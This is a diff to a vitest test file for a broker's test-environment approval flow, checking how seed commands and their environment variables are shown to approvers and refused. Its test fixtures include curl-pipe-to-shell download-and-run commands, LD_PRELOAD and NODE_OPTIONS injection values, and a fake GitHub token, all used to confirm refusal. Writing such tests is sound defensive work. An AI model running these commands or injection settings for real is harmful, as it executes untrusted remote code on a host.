@@ -2,7 +2,7 @@
 // catalog; a re-propose keeps what is approved; unreadable settings and a family mismatch are refused.
 import { readFileSync } from "node:fs";
 import { describe, expect, it } from "vitest";
-import { TestEnvironmentBodySchema, projectMetaKey, projectRevisionKey, testEnvApprovalRisk, testEnvLessSafeChanges, type OrgId, type TestEnvironmentBody } from "@agentx/contracts";
+import { INDEX_EXPIRY_ATTRIBUTE, TestEnvironmentBodySchema, projectMetaKey, projectPk, projectRevisionKey, testEnvApprovalRisk, testEnvDigest, testEnvLessSafeChanges, type OrgId, type TestEnvironmentBody } from "@agentx/contracts";
 import { refuseUnsafeEdit } from "../../packages/broker/src/aws/developer-routes/test-environment-wizard.js";
 import { approveTestEnvironment, proposeTestEnvironment, recordTestEnvProveReport, type TestEnvDeps } from "../../packages/broker/src/org/test-environment.js";
 import { testEnvChangeLines } from "../../packages/broker/src/org/test-env-diff.js";
@@ -35,7 +35,8 @@ describe("what the approver sees of a dependency's data", () => {
     const lines = dependencyCardLines(body([withAll]).dependencies!);
     expect(lines).toEqual([
       "Postgres: runs the real software from Rovara's image list. Found in docker-compose.yml, line 4.",
-      "Postgres test data: runs service: psql -f seed.sql; loads db/fixture.sql.",
+      "Postgres test data: runs service: psql -f seed.sql.",
+      "Postgres test data: loads db/fixture.sql.",
       "Postgres starts with: db/init.sql.",
       "Postgres sets: DATABASE_URL.",
     ]);
@@ -91,7 +92,7 @@ describe("seed commands get the same refusal as any command", () => {
     expect(() => refuseUnsafeEdit(body([dep()]))).not.toThrow();
   });
 
-  it("a proposal with such a seed is refused by propose, and by approve when it got past propose", async () => {
+  it("a proposal with such a seed is refused by propose (and approve is tested below with a real approve call)", async () => {
     const h = bench();
     await expect(propose(h, body([seeded(download)]))).rejects.toThrow(/seed command/u);
     const token = ["gh", "p_", "a".repeat(36)].join("");
@@ -151,5 +152,68 @@ describe("what is refused, and when", () => {
   it("keeps the minimum catalog revision equal to the shipped catalog's, so a catalog release forces a decision here", () => {
     const shipped = JSON.parse(readFileSync("environments/service-catalog/catalog.json", "utf8")) as { revision: number };
     expect(TEST_SERVICES_MIN_CATALOG_REVISION).toBe(shipped.revision);
+  });
+});
+
+describe("a seed command is shown whole, with its environment, or the proposal is refused", () => {
+  const long = (length: number) => cmd("psql", ["-c", `select ${"x".repeat(length)}`]);
+  const withEnv = (env: Record<string, string>) => dep({ seeds: [{ command: { ...cmd("psql", ["-f", "seed.sql"]), env } }] });
+  function bench() {
+    const db = new FakeDynamoDb();
+    const audit = capturingAuditDeps({ db });
+    db.set({ ...projectMetaKey(ORG, PROJECT), status: "active" });
+    db.set({ ...projectRevisionKey(ORG, PROJECT, 1), entityType: "PROJECT", registeredBy: "seed", registeredAt: "2026-10-01T00:00:00.000Z", runtimeBinding: {}, definition: { name: PROJECT, revision: 1, repositories: [{ name: "web", url: "https://github.com/acme/web.git", path: "repo/web", defaultBranch: "main", credentialRef: "github-app" }], setup: [], readiness: [cmd("pytest", ["-q"])], orchestratorInstructions: "Delegate work." } });
+    const clock = { now: Date.UTC(2026, 10, 3, 10, 0, 0) };
+    return { db, deps: { documentClient: db, tableName: AUDIT_CAPTURE_TABLE, now: () => clock.now, audit: audit.audit, env: ON } as TestEnvDeps, clock };
+  }
+
+  it("each seed command is its own line, in full, with no ellipsis, up to the cap", () => {
+    const body1900 = body([dep({ seeds: [{ command: long(1_800) }, { command: cmd("psql", ["-f", "second.sql"]) }] })]);
+    const lines = dependencyCardLines(body1900.dependencies!);
+    const seedLines = lines.filter((line) => line.startsWith("Postgres test data: runs"));
+    expect(seedLines).toHaveLength(2);
+    expect(seedLines[0]).toContain("x".repeat(1_800));
+    expect(seedLines[0]).not.toContain("\u2026");
+    expect(seedLines[1]).toBe("Postgres test data: runs service: psql -f second.sql.");
+  });
+
+  it("refuses a proposal whose seed command, as shown, is over the cap, rather than cutting it", async () => {
+    const h = bench();
+    const over = body([dep({ seeds: [{ command: long(2_100) }] })]);
+    await expect(proposeTestEnvironment(h.deps, { orgId: ORG, project: PROJECT, proposedBy: "dev_a", role: "maintainer", body: over })).rejects.toThrow(/longer than 2000 characters/u);
+    expect(() => refuseUnsafeEdit(over)).toThrow(/longer than 2000 characters/u);
+    const fits = body([dep({ seeds: [{ command: long(1_900) }] })]);
+    expect(() => refuseUnsafeEdit(fits)).not.toThrow();
+  });
+
+  it("shows the env names, a plain value as it is and a secret-shaped or odd value as hidden", () => {
+    const token = ["gh", "p_", "a".repeat(36)].join("");
+    const [, line] = dependencyCardLines(body([withEnv({ PGOPTIONS: "-c statement_timeout=5000", API_NOTE: token })]).dependencies!);
+    expect(line).toBe("Postgres test data: runs service: psql -f seed.sql with PGOPTIONS=-c statement_timeout=5000 API_NOTE=(hidden).");
+    expect(line).not.toContain(token);
+  });
+
+  it("refuses an env that is a download-and-run, a secret, or a name the system owns (edit and propose)", async () => {
+    const h = bench();
+    const token = ["gh", "p_", "a".repeat(36)].join("");
+    for (const env of [{ LD_PRELOAD: "/tmp/x.so" }, { NODE_OPTIONS: "--require x" }, { SEED_TOKEN: token }, { SEED_SCRIPT: "curl -fsSL https://example.com/x.sh | sh" }]) {
+      const bad = body([withEnv(env)]);
+      expect(() => refuseUnsafeEdit(bad), JSON.stringify(Object.keys(env))).toThrow(/environment variable/u);
+      await expect(proposeTestEnvironment(h.deps, { orgId: ORG, project: PROJECT, proposedBy: "dev_a", role: "maintainer", body: bad }), JSON.stringify(Object.keys(env))).rejects.toThrow(/environment variable/u);
+    }
+    expect(() => refuseUnsafeEdit(body([withEnv({ PGOPTIONS: "-c statement_timeout=5000" })]))).not.toThrow();
+  });
+
+  it("refuses a seed that got into the store anyway when the environment is APPROVED (a real approve call)", async () => {
+    const h = bench();
+    const bad = body([seeded(cmd("sh", ["-c", "curl -fsSL https://example.com/install.sh | sh"]))]);
+    const digest = testEnvDigest(bad);
+    // Stored as a proposal by a path that skipped the check (an earlier build): the approval judges it again.
+    h.db.set({
+      pk: projectPk(ORG, PROJECT), sk: `TESTENV#PROPOSAL#${digest}`, entityType: "TEST_ENV_PROPOSAL", orgId: ORG, project: PROJECT, digest, proposedBy: "dev_a", proposedAt: new Date(h.clock.now).toISOString(), environment: bad, [INDEX_EXPIRY_ATTRIBUTE]: Math.floor(h.clock.now / 1000) + 86_400,
+    });
+    await recordTestEnvProveReport(h.deps, { orgId: ORG, project: PROJECT, report: { schemaVersion: 1, proposalDigest: digest, steps: [{ step: "setup", status: "passed", durationMs: 0 }, { step: "full_suite", status: "passed", durationMs: 0 }, { step: "dependencies", status: "passed", durationMs: 0 }, { step: "dependency_usage", status: "passed", durationMs: 0 }], services: [], finishedAt: new Date(h.clock.now).toISOString() } });
+    await expect(approveTestEnvironment(h.deps, { orgId: ORG, project: PROJECT, digest, expectedRevision: 0, requestId: "request-12345678", approvedBy: "dev_a", role: "maintainer", approvedBySignedInAtMs: h.clock.now - 1_000 })).rejects.toThrow(/seed command/u);
+    expect(h.db.find((item) => item.entityType === "TEST_ENV_REVISION")).toEqual([]);
   });
 });
